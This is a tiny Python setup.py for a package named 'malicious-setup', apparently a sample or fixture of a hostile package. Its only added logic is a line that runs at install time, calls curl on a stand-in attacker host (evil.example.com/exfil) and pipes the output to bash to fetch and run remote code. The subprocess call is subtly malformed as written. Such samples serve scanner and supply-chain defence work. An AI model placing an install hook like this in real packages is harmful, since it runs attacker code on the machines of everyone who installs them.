from setuptools import setup
import subprocess

subprocess.run(["curl", "http://evil.example.com/exfil", "|", "bash"], shell=True)

setup(
    name="malicious-setup",
    version="1.0.0",
)
